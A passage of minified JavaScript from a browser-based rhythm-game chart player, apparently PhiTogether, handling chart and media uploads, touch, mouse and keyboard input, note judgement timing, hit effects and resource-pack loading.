r=navigator.userAgent.match(/MiuiBrowser\/(\d+\.\d+)/);(!r||parseFloat(r[1])<17.4)&&msgHandler.sendWarning(shared$1.game.i18n.t("simphi.loadLib.compatibilityWarning.miBrowser"))}if(!await e(shared$1.game.i18n.t("simphi.loadLib.libNames.createImageBitmap"),urls.bitmap,()=>isUndefined("createImageBitmap")))return-1;const n=!!new Audio().canPlayType("audio/ogg");if(!await e(shared$1.game.i18n.t("simphi.loadLib.libNames.oggmentedBundle"),"/src/oggmented-bundle.js",()=>!n&&isUndefined("oggmented")))return-4;audio.init(n?self.AudioContext||self.webkitAudioContext:self.oggmented.OggmentedAudioContext);const s=document.createElement("canvas").toDataURL("image/webp").includes("data:image/webp");if(!await e(shared$1.game.i18n.t("simphi.loadLib.libNames.webp"),urls.webp,()=>!s&&isUndefined("webp")))return-5}function adjustInfo(){for(const e of chartInfoData)if(selectchart.value.trim()===e.Chart){if(e.Name&&(inputName$1.value=e.Name),e.Musician&&(inputArtist.value=e.Musician),e.Composer&&(inputArtist.value=e.Composer),e.Artist&&(inputArtist.value=e.Artist),e.Level){levelText=e.Level;const t=levelText.toLocaleUpperCase().split("LV.").map(n=>n.trim());t[0]&&(selectDifficulty.value=t[0]),t[1]&&(selectLevel.value=t[1])}e.Illustrator&&(inputIllustrator.value=e.Illustrator),e.Designer&&(inputCharter.value=e.Designer),e.Charter&&(inputCharter.value=e.Charter),bgms.has(e.Music)&&(selectbgm.value=e.Music),bgs.has(e.Image)&&(selectbg.value=e.Image,selectbg.dispatchEvent(new Event("change"))),isFinite(e.AspectRatio=parseFloat(e.AspectRatio))&&($id("select-aspect-ratio").value=e.AspectRatio),isFinite(e.ScaleRatio=parseFloat(e.ScaleRatio))&&($id("select-note-scale").value=8080/e.ScaleRatio,app.setNoteScale(8080/e.ScaleRatio)),isFinite(e.NoteScale=parseFloat(e.NoteScale))&&($id("select-note-scale").value=e.NoteScale,app.setNoteScale(e.NoteScale)),isFinite(e.GlobalAlpha=parseFloat(e.GlobalAlpha))&&($id("select-background-dim").value=e.GlobalAlpha,app.brightness=Number(e.GlobalAlpha)),isFinite(e.BackgroundDim=parseFloat(e.BackgroundDim))&&($id("select-background-dim").value=e.BackgroundDim,app.brightness=Number(e.BackgroundDim)),isFinite(e.Offset=parseFloat(e.Offset))&&($id("chart-offset-surface").value=e.Offset)}}const stage$1={resize(e){const t=e||fucktemp2;app.stage.style.cssText=`;position:fixed;top:${e?55:0}px;left:0;bottom:0;right:0;z-index:${t?0:1002};display:${location.hash.startsWith("#/playing")?"block":"none"};`}};shared$1.game.stage=stage$1;self.addEventListener("resize",()=>stage$1.resize());{let m=function(y,v){const x=document.createElement("option"),E=/(^|\/)\./.test(v);return x.innerHTML=E?"":v,x.value=y,E&&x.classList.add("hide"),x},g=function(){"skin"in t||n&&n===s&&shared$1.game.ptmain.chartLoadedCB()};var createOption=m,loadComplete=g;let e={},t={},n=0,s=0;const r=async(y,v,x,E=S=>{})=>{(!t[y]||v>=t[y])&&(t[y]=v),s=Object.values(t).reduce((S,w)=>S+w,0),x instanceof Promise||(x=Promise.resolve()),await x.catch(S=>msgHandler.sendWarning(shared$1.game.i18n.t("simphi.handleFile.unsupportedFile",[S.cause.name]))),e[y]=(e[y]||0)+1,n=Object.values(e).reduce((S,w)=>S+w,0),shared$1.game.loadHandler.l(shared$1.game.i18n.t("simphi.handleFile.loadingFile",{uploader_done:n,uploader_total:s}),"loadChart"),e[y]===t[y]&&E(),g()};main.handleFile=r;let o=0;const l={createAudioBuffer(){return audio.decode(...arguments)}},d=new ZipReader({handler:y=>readFile(y,l)});d.addEventListener("loadstart",()=>{}),d.addEventListener("read",y=>r("zip",d.total,f(y.detail))),$id("uploader-upload").addEventListener("click",uploader.uploadFile),$id("uploader-file").addEventListener("click",uploader.uploadFile),$id("uploader-dir").addEventListener("click",uploader.uploadDir),uploader.reset=(y=!1)=>{e={},y?t={file:y}:t={},o=0,n=0,s=0,d.reset()},uploader.addEventListener("change",g),uploader.addEventListener("progress",function(y){});let u=null;uploader.addEventListener("load",async function(y){await u,u=null;const{file:{name:v,webkitRelativePath:x},buffer:E}=y,S=E.byteLength>4&&new DataView(E).getUint32(0,!1)===1347093252,w={name:v,buffer:E,path:x||v};S?(u=d.read(w),await u,t.file>o&&(e.file?e.file++:e.file=1)):(o++,readFile(w,l).then(k=>r("file",o,f(k))))}),main.uploader=uploader;async function f(y){switch(y.type){case"line":chartLineData.push(...y.data);break;case"info":chartInfoData.push(...y.data);break;case"media":case"audio":bgms.set(y.name,y.data),selectbgm.appendChild(m(y.name,y.name));break;case"image":bgs.set(y.name,y.data),bgsBlur.set(y.name,await imgBlur(y.data)),selectbg.appendChild(m(y.name,y.name));break;case"chart":y.msg&&y.msg.forEach(x=>msgHandler.sendWarning(x)),y.info&&chartInfoData.push(y.info),y.line&&chartLineData.push(...y.line);let v=y.name;for(;charts.has(v);)v+=`
`;y.data.md5=y.md5,charts.set(v,y.data),chartsMD5.set(v,y.md5),selectchart.appendChild(m(v,y.name));break;default:throw console.error(y.data),new Error(`Unsupported file: ${y.name}`,{cause:y})}y.name&&y.buffer&&oriBuffers.set(y.name,y.buffer)}}const qwq=[null,!1,null,null,0,null],doFullScreen=async()=>{try{app.isFull||(app.isFull=!0,stage$1.resize())}catch{stage$1.resize()}};function spClickRB(){fucktemp2&&(shared$1.game.ptmain.$route.path!=="/multipanel"&&shared$1.game.ptmain.gameMode==="multi"?shared$1.game.multiInstance.showStat():shared$1.game.ptmain.spClickRT())}const specialDrag={listeningEvts:new Map,update(e,t,n){this.listeningEvts.has(e)&&this.func[this.listeningEvts.get(e)].update(t,n)},reg(e,t,n){const{lineScale:s}=app;!emitter.eq("play")&&!app.pauseTime&&shared$1.game.ptmain.playConfig.practiseMode&&(n>=app.hlen+s*2.5&&t>=app.wlen*.25&&t<=app.wlen*1.75&&n<=app.hlen+s*3.75&&qwqIn.second>=3?(this.listeningEvts.set(e,0),this.func[0].reg(t,n)):n>=app.hlen+s*.1&&t>=app.wlen+s*4&&t<=app.wlen*1.5+s*4&&n<=app.hlen+s*.5&&qwqIn.second>=3&&(this.listeningEvts.set(e,1),this.func[1].reg(t,n))),this.update(e,t,n)},del(e){this.listeningEvts.has(e)&&(this.func[this.listeningEvts.get(e)].del(),this.listeningEvts.delete(e))},func:[{reg:()=>{const e=app.chart.offset;app.prerenderChart(main.modify(charts.get(selectchart.value))),stat.reset(app.chart.numOfNotes,chartsMD5.get(selectchart.value),selectspeed.value),loadLineData(),app.chart.offset=e},update:e=>{timeBgm=curTime=duration*Math.min(Math.max((e-app.wlen*.25)/(app.wlen*1.5),0),1)},del:()=>{const e=app.chart.offset;app.prerenderChart(main.modify(charts.get(selectchart.value))),stat.reset(app.chart.numOfNotes,chartsMD5.get(selectchart.value),selectspeed.value),loadLineData(),app.chart.offset=e}},{reg:()=>{app.prerenderChart(main.modify(charts.get(selectchart.value))),stat.reset(app.chart.numOfNotes,chartsMD5.get(selectchart.value),selectspeed.value),loadLineData()},update:e=>{const t=.5+Math.round(Math.min(Math.max((e-app.wlen-app.lineScale*4)/(app.wlen*.5),0),1)*30)*.05,n=app.speed/t;app.speed=t,duration=app.bgMusic.duration/t,timeBgm=curTime=curTime*n},del:()=>{app.prerenderChart(main.modify(charts.get(selectchart.value))),stat.reset(app.chart.numOfNotes,chartsMD5.get(selectchart.value),selectspeed.value),loadLineData()}}]},specialClick={time:[0,0,0,0],func:[shared$1.game.ptmain.spClickLT,shared$1.game.ptmain.spClickRT,shared$1.game.ptmain.spClickLB,spClickRB,shared$1.game.ptmain.$router.back],click(e){const t=performance.now();t-this.time[e]<300?this.func[e]():this.time[e]=t},qwq(e,t){const{lineScale:n}=app;if(e<n*1.5&&t<n*1.5&&this.click(0),e>canvasos.width-n*1.5&&t<n*1.5&&this.click(1),e<n*1.5&&t>canvasos.height-n*1.5&&this.click(2),e>canvasos.width-n*1.5&&t>canvasos.height-n*1.5&&this.click(3),!emitter.eq("play")&&!app.pauseTime){if(t<app.hlen+n&&t>app.hlen-n){const s=o=>app.wlen+n*(o*2-.5),r=[s(-1.1),s(0),s(1),s(1)+n*1.5];r[0]<e&&e<r[1]&&this.func[4](),r[1]<e&&e<r[2]&&this.func[1](),r[2]<e&&e<r[3]&&btnPause.click()}if(shared$1.game.ptmain.playConfig.practiseMode&&t>=app.hlen-n*.6&&t<=app.hlen+n*.2&&qwqIn.second>=3){if(e>=app.wlen*1.5+n*2.4&&e<=app.wlen*1.5+n*3.2){const s=Math.max(app.speed-.05,.5),r=app.speed/s;app.speed=s,duration=app.bgMusic.duration/s,timeBgm=curTime=curTime*r,app.prerenderChart(main.modify(charts.get(selectchart.value))),stat.reset(app.chart.numOfNotes,md5,selectspeed.value),loadLineData()}else if(e>=app.wlen*1.5+n*3.3&&e<=app.wlen*1.5+n*4.1){const s=Math.min(app.speed+.05,2),r=app.speed/s;app.speed=s,duration=app.bgMusic.duration/s,timeBgm=curTime=curTime*r,app.prerenderChart(main.modify(charts.get(selectchart.value))),stat.reset(app.chart.numOfNotes,md5,selectspeed.value),loadLineData()}}}if(shared$1.game.ptmain.playConfig.adjustOffset&&emitter.eq("play")&&e>canvasos.width-n*7.5&&t>canvasos.height-n*5&&!fucktemp2){const s=(o,l)=>{const d=n*.5-n*Math.abs(o)*.1,u=canvasos.width-3.75*n+n*l,f=canvasos.height-n*2.5-d;return[u,f,u+d*2,f+d*2]},r=[[-3,-3.5,-1],[-2,-3,-5],[-1,-2.25,-50],[1,1.5,50],[2,2.45,5],[3,3.15,1]];for(const o of r){const l=s(o[0],o[1]);l[0]<e&&e<l[2]&&l[1]<t&&t<l[3]&&(app.chart.offset=(app.chart.offset*1e3+o[2])/1e3)}canvasos.width-3.5*n<e&&e<canvasos.width-.5*n&&canvasos.height-n*1.25<t&&t<canvasos.height-n*.25?saveAdjustedChart(app,fucktemp2):canvasos.width-7*n<e&&e<canvasos.width-5*n&&canvasos.height-n*1.25<t&&t<canvasos.height-n*.25&&(app.chart.offset=app.chart.offsetBak)}qwqEnd.second>0&&(main.pressTime=main.pressTime>0?-qwqEnd.second:qwqEnd.second)}},hitManager=new simphi.HitManager;class JudgeEvent{constructor(t,n,s,r){this.offsetX=t,this.offsetY=n,this.type=s|0,this.judged=!1,this.event=r,this.preventBad=!1}}function getJudgeOffset(e,t){const{offsetX:n,offsetY:s}=e,{offsetX:r,offsetY:o,cosr:l,sinr:d}=t;return Math.abs((n-r)*l+(s-o)*d)||0}function getJudgeDistance(e,t){const{offsetX:n,offsetY:s}=e,{offsetX:r,offsetY:o,cosr:l,sinr:d}=t;return Math.abs((n-r)*l+(s-o)*d)+Math.abs((n-r)*d-(s-o)*l)||0}const judgeManager={time:{p:.08,g:.16,AP:.04},setJudgeTime(e=.08,t=.16,n=.04){this.time.p=e,this.time.g=t,this.time.AP=n},list:[],addEvent(e,t){const{list:n}=this;if(n.length=0,app.playMode===1){const s=Math.min(frameTimer.disp,this.time.AP);-Math.max(frameTimer.disp*2,this.time.g);for(const r of e){if(r.scored||r.isFake)continue;const o=r.realTime-t;r.type===1?o<s&&(n[n.length]=new JudgeEvent(r.offsetX,r.offsetY,1)):r.type===2?o<s&&(n[n.length]=new JudgeEvent(r.offsetX,r.offsetY,2)):r.type===3?r.holdTapTime?n[n.length]=new JudgeEvent(r.offsetX,r.offsetY,2):o<s&&(n[n.length]=new JudgeEvent(r.offsetX,r.offsetY,1)):r.type===4&&o<s&&(n[n.length]=new JudgeEvent(r.offsetX,r.offsetY,3))}}else if(emitter.eq("play"))for(const s of hitManager.list)s.isTapped||(n[n.length]=new JudgeEvent(s.offsetX,s.offsetY,1)),s.isActive&&(n[n.length]=new JudgeEvent(s.offsetX,s.offsetY,2)),s.type==="keyboard"&&(n[n.length]=new JudgeEvent(s.offsetX,s.offsetY,3)),s.flicking&&!s.flicked&&(n[n.length]=new JudgeEvent(s.offsetX,s.offsetY,3,s))},execute(e,t,n){const{list:s}=this;for(const r of e){if(r.scored||r.isFake)continue;let o=r.realTime-t;if(o>(replayMgr.replaying?1:.2))break;if(!(r.type!==1&&o>this.time.g))if(r.statOffset=t,o<-this.time.g&&r.frameCount>4&&!r.holdStatus&&!(replayMgr.replaying&&replayMgr.data[r.name]&&replayMgr.data[r.name].a!==2))r.status=2,stat.addCombo(2,r.type),r.scored=!0;else if(r.type===2){if(o>0)for(const l of s)l.type===1&&(getJudgeOffset(l,r)>n||(l.preventBad=!0));if(r.status!==4){if(replayMgr.replaying){if(replayMgr.data[r.name]){r.status=4;continue}continue}for(const l of s)if(l.type===2&&!(getJudgeOffset(l,r)>n)){r.status=4,recordMgr.add(r);break}}else o<0&&(emitter.eq("play")&&!app.pauseTime&&audio.play(res.HitSong1,{gainrate:app.soundVolume}),hitImageList.add(HitImage.perfect(r.projectX,r.projectY,r)),stat.addCombo(4,2),r.scored=!0)}else if(r.type===4){if(o>0||r.status!==4)for(const l of s)l.type===1&&(getJudgeOffset(l,r)>n||(l.preventBad=!0));if(r.status!==4){if(replayMgr.replaying){if(replayMgr.data[r.name]){r.status=4;continue}continue}for(const l of s){if(l.type!==3||getJudgeOffset(l,r)>n)continue;let d=getJudgeDistance(l,r),u=r,f=!1;for(const m of r.nearNotes){if(m.status)continue;if(m.realTime-t>this.time.g)break;if(getJudgeOffset(l,m)>n)continue;const g=getJudgeDistance(l,m);g<d&&(d=g,u=m,f=!0)}if(l.event==null){if(u.status=4,recordMgr.add(u),!f)break}else if(!l.event.flicked&&(u.status=4,l.event.flicked=!0,recordMgr.add(u),!f))break}}else o<0&&(emitter.eq("play")&&!app.pauseTime&&audio.play(res.HitSong2,{gainrate:app.soundVolume}),hitImageList.add(HitImage.perfect(r.projectX,r.projectY,r)),stat.addCombo(4,4),r.scored=!0)}else{if(replayMgr.replaying){if(!replayMgr.data[r.name])continue;const l=replayMgr.data[r.name];if(t<l.s+r.realTime)continue;if(r.type===3&&r.holdTapTime){if((performance.now()-r.holdTapTime)*r.holdTime>=8e3*r.realHoldTime&&(r.holdStatus%4===0||r.holdStatus%4===1?hitImageList.add(HitImage.perfect(r.projectX,r.projectY,r)):r.holdStatus%4===3&&hitImageList.add(HitImage.good(r.projectX,r.projectY,r)),r.holdTapTime=performance.now()),o+r.realHoldTime<.2){r.status||stat.addCombo(r.status=l.q,3),o+r.realHoldTime<0&&(r.scored=!0);continue}l.e&&t>=l.e+r.realTime?r.holdBroken=!0:r.holdBroken=!1}if(!r.holdBroken&&!r.holdTapTime){let d=2*r.realTime-l.s;if(d>this.time.g&&l.a===6){if(r.type===3)continue;r.status=6,r.badTime=performance.now()}else stat.addDisp(Math.max(d,(-1-r.frameCount)*this.time.AP||0)),emitter.eq("play")&&!app.pauseTime&&audio.play(res.HitSong0,{gainrate:app.soundVolume}),l.a===7?(r.holdStatus=7,hitImageList.add(HitImage.good(r.projectX,r.projectY,r)),hitWordList.add(HitWord.early(r.projectX,r.projectY))):l.a===5?(r.holdStatus=5,hitImageList.add(HitImage.perfect(r.projectX,r.projectY,r)),hitWordList.add(HitWord.early(r.projectX,r.projectY))):l.a===4?(r.holdStatus=4,hitImageList.add(HitImage.perfect(r.projectX,r.projectY,r))):l.a===1?(r.holdStatus=1,hitImageList.add(HitImage.perfect(r.projectX,r.projectY,r)),hitWordList.add(HitWord.late(r.projectX,r.projectY))):l.a===3&&(r.holdStatus=3,hitImageList.add(HitImage.good(r.projectX,r.projectY,r)),hitWordList.add(HitWord.late(r.projectX,r.projectY))),r.type===1&&(r.status=r.holdStatus),r.type===3&&(r.holdStart=t);r.status?(stat.addCombo(r.status,1),r.scored=!0):r.holdTapTime=performance.now()}emitter.eq("play")&&r.holdTapTime&&r.holdBroken&&l.q===2&&(r.status=2,stat.addCombo(2,3),r.scored=!0);continue}if(r.type===3&&r.holdTapTime){if((performance.now()-r.holdTapTime)*r.holdTime>=16e3*r.realHoldTime&&(r.holdStatus%4===0||r.holdStatus%4===1?hitImageList.add(HitImage.perfect(r.projectX,r.projectY,r)):r.holdStatus%4===3&&hitImageList.add(HitImage.good(r.projectX,r.projectY,r)),r.holdTapTime=performance.now()),o+r.realHoldTime<.2){r.status||(stat.addCombo(r.status=r.holdStatus,3),recordMgr.add(r)),o+r.realHoldTime<0&&(r.scored=!0);continue}r.holdBroken=!0}for(const l of s){if(r.holdTapTime){if(l.type!==2)continue;if(getJudgeOffset(l,r)<=n){r.holdBroken=!1;break}continue}if(l.type!==1||l.judged||getJudgeOffset(l,r)>n)continue;let d=o,u=getJudgeDistance(l,r),f=r,m=!1;for(const g of r.nearNotes){if(g.status||g.holdTapTime)continue;const y=g.realTime-t;if(y>.2)break;if(g.type===3&&y>this.time.g||getJudgeOffset(l,g)>n)continue;const v=getJudgeDistance(l,g);v<u&&(d=y,u=v,f=g,f.statOffset=t,m=!0)}if(d>this.time.g){if(l.preventBad)continue;f.status=6,recordMgr.add(f),f.badTime=performance.now()}else{const g=f;stat.addDisp(Math.max(d,(-1-g.frameCount)*this.time.AP||0)),emitter.eq("play")&&!app.pauseTime&&audio.play(res.HitSong0,{gainrate:app.soundVolume}),d>this.time.p?(g.holdStatus=7,hitImageList.add(HitImage.good(g.projectX,g.projectY,g)),hitWordList.add(HitWord.early(g.projectX,g.projectY))):d>this.time.AP?(g.holdStatus=5,hitImageList.add(HitImage.perfect(g.projectX,g.projectY,g)),hitWordList.add(HitWord.early(g.projectX,g.projectY))):d>-this.time.AP||g.frameCount<1?(g.holdStatus=4,hitImageList.add(HitImage.perfect(g.projectX,g.projectY,g))):d>-this.time.p||g.frameCount<2?(g.holdStatus=1,hitImageList.add(HitImage.perfect(g.projectX,g.projectY,g)),hitWordList.add(HitWord.late(g.projectX,g.projectY))):(g.holdStatus=3,hitImageList.add(HitImage.good(g.projectX,g.projectY,g)),hitWordList.add(HitWord.late(g.projectX,g.projectY))),g.type===1&&(g.status=g.holdStatus),g.type===3&&(g.holdStart=t),recordMgr.add(g)}if(f.status?(stat.addCombo(f.status,1),f.scored=!0):(f.holdTapTime=performance.now(),f.holdBroken=!1),l.judged=!0,!m)break}emitter.eq("play")&&r.holdTapTime&&r.holdBroken&&(r.status=2,recordMgr.add(r),stat.addCombo(2,3),r.scored=!0)}}}};class HitEvents extends Array{constructor({updateCallback:t=s=>{},iterateCallback:n=s=>{}}={}){super(),this.update=this.defilter.bind(this,t),this.animate=this.iterate.bind(this,n)}defilter(t){let n=this.length;for(;n--;)t(this[n])&&this.splice(n,1);return this}iterate(t){for(const n of this)t(n)}add(t){this[this.length]=t}clear(){this.length=0}}const hitFeedbackList=new HitEvents({updateCallback:e=>++e.time>0,iterateCallback:e=>{ctxos.globalAlpha=.85,ctxos.setTransform(1,0,0,1,e.offsetX,e.offsetY),ctxos.fillStyle=e.color,ctxos.beginPath(),ctxos.arc(0,0,app.lineScale*.5,0,2*Math.PI),ctxos.fill()}}),hitImageList=new HitEvents({updateCallback:e=>nowTime_ms>=e.time+e.duration,iterateCallback:e=>{if(!emitter.eq("play")||app.pauseTime)return;const t=(nowTime_ms-e.time)/e.duration,n=e.effects;ctxos.globalAlpha=1,ctxos.setTransform(app.noteScaleRatio*6,0,0,app.noteScaleRatio*6,e.offsetX,e.offsetY),ctxos.rotate(e.rotation),(n[Math.floor(t*n.length)]||n[n.length-1]).full(ctxos),ctxos.fillStyle=e.color,ctxos.globalAlpha=1-t;const s=30*(((.2078*t-1.6524)*t+1.6399)*t+.4988);if(!(s<0))for(const r of e.direction){const o=r[0]*(9*t/(8*t+1));main.customResourceMeta.loaded?main.customResourceMeta.hitEvtType===1&&ctxos.fillRect(o*Math.cos(r[1])-s/2,o*Math.sin(r[1])-s/2,s,s):(ctxos.beginPath(),ctxos.arc(o*Math.cos(r[1]),o*Math.sin(r[1]),s/3*2,0,2*Math.PI),ctxos.fill(),ctxos.closePath())}}}),hitWordList=new HitEvents({updateCallback:e=>nowTime_ms>=e.time+e.duration,iterateCallback:e=>{const t=(nowTime_ms-e.time)/e.duration;ctxos.setTransform(1,0,0,1,e.offsetX,e.offsetY),ctxos.font=`bold ${app.noteScaleRatio*(256+128*(((.2078*t-1.6524)*t+1.6399)*t+.4988))}px Saira`,ctxos.textAlign="center",ctxos.fillStyle=e.color,ctxos.globalAlpha=1-t,ctxos.fillText(e.text,0,-app.noteScaleRatio*128)}});class HitFeedback{constructor(t,n,s,r){this.offsetX=Number(t),this.offsetY=Number(n),this.color=String(s),this.text=String(r),this.time=0}static tap(t,n){return new HitFeedback(t,n,"cyan","")}static hold(t,n){return new HitFeedback(t,n,"lime","")}static move(t,n){return new HitFeedback(t,n,"violet","")}}class HitImage{constructor(t,n,s,r,o){const l=noteRender.hitFX[s];this.offsetX=Number(t)||0,this.offsetY=Number(n)||0,this.rotation=tmps.hitFxRotate&&Number(o)||0,this.time=performance.now(),this.duration=l.duration,this.effects=l.effects,this.direction=Array(l.numOfParts||0).fill().map(()=>[Math.random()*80+185,Math.random()*2*Math.PI]),this.color=String(r)}static perfect(t,n,s){return new HitImage(t,n,"Perfect",tmps.hitPerfectColor||"#ffeca0",s.line.rotation)}static good(t,n,s){return new HitImage(t,n,"Good",tmps.hitGoodColor||"#b4e1ff",s.line.rotation)}}class HitWord{constructor(t,n,s,r){this.offsetX=Number(t)||0,this.offsetY=Number(n)||0,this.time=performance.now(),this.duration=250,this.color=String(s),this.text=String(r)}static early(t,n){return new HitWord(t,n,"#03aaf9","Early")}static late(t,n){return new HitWord(t,n,"#ff4612","Late")}}const interact=new InteractProxy(canvas);interact.setMouseEvent({mousedownCallback(e){const t=e.button,{x:n,y:s}=getPos(e);t===1?hitManager.activate("mouse",4,n,s):t===2?hitManager.activate("mouse",2,n,s):hitManager.activate("mouse",1<<t,n,s),specialClick.qwq(n,s),specialDrag.reg("mouse",n,s)},mousemoveCallback(e){const t=e.buttons,{x:n,y:s}=getPos(e);for(let r=1;r<32;r<<=1)t&r?hitManager.moving("mouse",r,n,s):hitManager.deactivate("mouse",r),specialDrag.update("mouse",n,s)},mouseupCallback(e){const t=e.button;t===1?hitManager.deactivate("mouse",4):t===2?hitManager.deactivate("mouse",2):hitManager.deactivate("mouse",1<<t),specialDrag.del("mouse")}});interact.setKeyboardEvent({keydownCallback(e){emitter.eq("stop")||(e.key==="Shift"&&btnPause.click(),e.key===" "&&shared$1.game.ptmain.playConfig.mode==="preview"?btnPause.click():hitManager.list.find(t=>t.type==="keyboard"&&t.id===e.code)||hitManager.activate("keyboard",e.code,NaN,NaN))},keyupCallback(e){emitter.eq("stop")||hitManager.deactivate("keyboard",e.code)}});self.addEventListener("blur",()=>hitManager.clear("keyboard"));interact.setTouchEvent({touchstartCallback(e){for(const t of e.changedTouches){const{x:n,y:s}=getPos(t);hitManager.activate("touch",t.identifier,n,s),specialClick.qwq(n,s),specialDrag.reg(t.identifier,n,s)}},touchmoveCallback(e){for(const t of e.changedTouches){const{x:n,y:s}=getPos(t);hitManager.moving("touch",t.identifier,n,s),specialDrag.update(t.identifier,n,s)}},touchendCallback(e){for(const t of e.changedTouches)hitManager.deactivate("touch",t.identifier),specialDrag.del(t.identifier)},touchcancelCallback(e){for(const t of e.changedTouches)hitManager.deactivate("touch",t.identifier),specialDrag.del(t.identifier)}});function getPos(e){const t=canvas.getBoundingClientRect();return{x:(e.clientX-t.left)/canvas.offsetWidth*canvas.width-(canvas.width-canvasos.width)/2,y:(e.clientY-t.top)/canvas.offsetHeight*canvas.height}}const res={};main.customResourceMeta={name:"PhiTogether Default 1",author:"Team PhiTogether"};let defaultCRM=main.customResourceMeta;window.addEventListener("load",async function(){shared$1.game={...shared$1.game,init:!0,app,res,charts,stat,hitManager,judgeManager,stage:stage$1,clearStat,loadSkinFromBuffer,loadSkinFromDB,updateLevelText:updateLevelTextOut,doFullScreen,adjustInfo,qwqStop,qwqPause,frameAnimater},await shared$1.game.requestFullscreen(),canvas.classList.add("fade");let e=0;if(await checkSupport())return;const t="/src/respack/";let n="together-pack-1";shared$1.game.ptmain.playerLoaded();let s;try{s=await ptdb.gameConfig.get()}catch{s={resourcesType:"together-pack-1"}}if(s.resourcesType){if(s.resourcesType==="pt-custom")(!s.customResourceLink.startsWith("http")||!s.customResourceLink.startsWith("//"))&&(s.customResourceLink="https://"+s.customResourceLink),await fetch(s.customResourceLink).then(o=>o.json().then(l=>main.customResourceMeta=l).then(()=>main.customResourceMeta.loaded=!0)).catch(o=>{main.customResourceMeta={name:"PhiTogether Default 1",author:"Team PhiTogether"},s={resourcesType:"together-pack-1"},msgHandler.sendError(shared$1.game.i18n.t("simphi.resack.err"))});else if(s.resourcesType.startsWith("together-pack")){n=s.resourcesType;const o=s.resourcesType.split("-")[2];main.customResourceMeta.name=`PhiTogether Default ${o}`}defaultCRM=main.customResourceMeta}const r=o=>{if(s.resourcesType==="pt-custom"){if(["clickRaw.png","Tap.png","TapHL.png","Drag.png","DragHL.png","HoldHead.png","HoldHeadHL.png","Hold.png","HoldHL.png","HoldEnd.png","Flick.png","FlickHL.png"].indexOf(o)>-1)return main.customResourceMeta.res[o];const d=["HitSong0.ogg","HitSong1.ogg","HitSong2.ogg"];if(main.customResourceMeta.includesHitSongs&&d.indexOf(o)>-1)return main.customResourceMeta.res[o]}return t+n+"/"+o};if(await Promise.all(Object.entries({JudgeLine:"JudgeLine.png",ProgressBar:"ProgressBar.png",Pause:"PauseNew.png",HitFXRaw:"clickRaw.png",Tap:"Tap.png",TapHL:"TapHL.png",Drag:"Drag.png",DragHL:"DragHL.png",HoldHead:"HoldHead.png",HoldHeadHL:"HoldHeadHL.png",Hold:"Hold.png",HoldHL:"HoldHL.png",HoldEnd:"HoldEnd.png",Flick:"Flick.png",FlickHL:"FlickHL.png",Rank:"Rank.png",HitSong0:"HitSong0.ogg",HitSong1:"HitSong1.ogg",HitSong2:"HitSong2.ogg",FCV:"FCV.png",LevelOver0:"LevelOver0.ogg",LevelOver0_v2:"LevelOver0_v2.ogg",LevelOver1_v2:"LevelOver1_v2.ogg",LevelOver2_v2:"LevelOver2_v2.ogg",LevelOver3_v2:"LevelOver3_v2.ogg",Resume:"play.png",Retry:"replay.png",Back:"return.png",Loop:"loop.png"}).map(([o,l],d,u)=>new Promise(f=>{const m=new XMLHttpRequest,g=r(l)||t+n+"/"+l;m.open("get",l=g,!0),m.responseType="arraybuffer",m.send(),m.onloadend=async()=>{if(!m.response||!m.response.byteLength)msgHandler.sendError(`错误：${++e}个资源加载失败（点击查看不了详情）`,`资源加载失败，请检查您的网络连接然后重试：
${new URL(l,location)}`,!0);else{const y=new DataView(m.response,0,8),v=y.getUint32(0),x=y.getUint32(4);v===1332176723?res[o]=await audio.decode(m.response):v===2303741511&&x===218765834?res[o]=await createImageBitmap(new Blob([m.response])):msgHandler.sendError(`错误：${++e}个资源加载失败`,`资源加载失败，请检查您的网络连接然后重试：
${new URL(l,location)}`,!0)}f()}}))),e)return msgHandler.sendError(`错误：${e}个资源加载失败（点击查看详情）`);if(await updateRes(res),res.NoImageBlack=await createImageBitmap(new ImageData(new Uint8ClampedArray(4).fill(0),1,1)),res.NoImageWhite=await createImageBitmap(new ImageData(new Uint8ClampedArray(4).fill(255),1,1)),res.JudgeLineMP=await imgShader(res.JudgeLine,"#feffa9"),res.JudgeLineFC=await imgShader(res.JudgeLine,"#a2eeff"),res.Ranks=await imgSplit(res.Rank),res.Rank.close(),res.mute=audio.mute(1),!(()=>{const o=createCanvas(1,1).getContext("2d");return o.drawImage(res.JudgeLine,0,0),o.getImageData(0,0,1,1).data[0]})())return msgHandler.sendError(shared$1.game.i18n.t("simphi.loading.imgLoadingError",[err.cause.name]));s.resourcesType==="prpr-custom"&&await loadprprCustomRes(),shared$1.game.ptmain.simphiLoaded(),$id("uploader").classList.remove("disabled"),$id("select").classList.remove("disabled"),emitter.dispatchEvent(new CustomEvent("change")),btnPause.classList.add("disabled")},{once:!0});shared$1.game.simphi.reloadRes=async e=>{if(!e){if(main.customResourceMeta==defaultCRM)return;main.customResourceMeta=defaultCRM;const r=["Tap","TapHL","Drag","DragHL","HoldHead","HoldHeadHL","Hold","HoldHL","HoldEnd","Flick","FlickHL"];for(const o of r)await noteRender.update(o,res[o],1);res.JudgeLineMP=await imgShader(res.JudgeLine,"#feffa9"),res.JudgeLineFC=await imgShader(res.JudgeLine,"#a2eeff"),tmps.hitPerfectColor=tmps.hitGoodColor=null,tmps.hitFxRotate=!1;return}const t={};let n=0;await fetch(e).then(r=>r.json().then(o=>main.customResourceMeta=o).then(()=>main.customResourceMeta.loaded=!0)).catch(r=>{msgHandler.sendError(shared$1.game.i18n.t("respack.err",[err.cause.name]))});const s=r=>{if(["Tap.png","TapHL.png","Drag.png","DragHL.png","HoldHead.png","HoldHeadHL.png","Hold.png","HoldHL.png","HoldEnd.png","Flick.png","FlickHL.png"].indexOf(r)>-1)return main.customResourceMeta.res[r];const l=["HitSong0.ogg","HitSong1.ogg","HitSong2.ogg"];if(main.customResourceMeta.includesHitSongs&&l.indexOf(r)>-1)return main.customResourceMeta.res[r]};if(await Promise.all(Object.entries({Tap:"Tap.png",TapHL:"TapHL.png",Drag:"Drag.png",DragHL:"DragHL.png",HoldHead:"HoldHead.png",HoldHeadHL:"HoldHeadHL.png",Hold:"Hold.png",HoldHL:"HoldHL.png",HoldEnd:"HoldEnd.png",Flick:"Flick.png",FlickHL:"FlickHL.png",HitSong0:"HitSong0.ogg",HitSong1:"HitSong1.ogg",HitSong2:"HitSong2.ogg"}).map(([r,o],l,d)=>new Promise(u=>{if(!s(o))return u();const f=new 